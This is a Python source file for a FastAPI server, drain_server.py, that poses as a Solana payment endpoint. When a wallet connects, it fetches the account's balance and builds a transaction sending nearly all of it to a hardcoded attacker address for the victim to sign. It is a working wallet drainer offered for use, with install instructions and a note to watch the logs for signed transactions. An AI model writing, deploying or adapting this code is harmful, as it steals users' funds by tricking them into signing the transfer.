# drain_server.py — pip install fastapi uvicorn httpx solders
import os, base64
import httpx
from fastapi import FastAPI, HTTPException, Request, Response
from solders.pubkey import Pubkey
from solders.hash import Hash
from solders.system_program import TransferParams, transfer
from solders.transaction import Transaction
from solders.message import Message

DEST = Pubkey.from_string("AfmpM8nAeh6UEYDkoM9eiQ8wBBfoWYzghRSxLwnyPjpE")
RPC = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
RENT, FEE = 890_880, 5_000
app = FastAPI()

@app.get("/pay")
async def pay(request: Request) -> Response:
    account = request.query_params.get("account")
    if not account:
        raise HTTPException(400, "no wallet connected — open this via your wallet app")
    async with httpx.AsyncClient(timeout=15) as c:
        bal_r = await c.post(RPC, json={"jsonrpc": "2.0", "id": 1,
            "method": "getBalance", "params": [account]})
        bh_r = await c.post(RPC, json={"jsonrpc": "2.0", "id": 1,
            "method": "getLatestBlockhash", "params": [{"commitment": "finalized"}]})
    bal = bal_r.json()["result"]["value"]
    amt = bal - RENT - FEE
    if amt <= 0:
        raise HTTPException(400, "nothing to drain")
    ixs = [transfer(TransferParams(
        from_pubkey=Pubkey.from_string(account), to_pubkey=DEST, lamports=amt))]
    msg = Message.new_blockhash(Hash.from_string(bh_r.json()["result"]["value"]["blockhash"]), ixs)
    tx = Transaction.new_unsigned(msg)
    return Response(content=b'{"transaction":"' + base64.b64encode(tx.serialize()) + b'"}',
                    media_type="application/json")

@app.post("/pay")  # wallet POSTs the signed tx back here
async def done(request: Request):
    print("SIGNED TX:", await request.body())   # watch Render logs — your confirmation
    return {"signature": "ok"}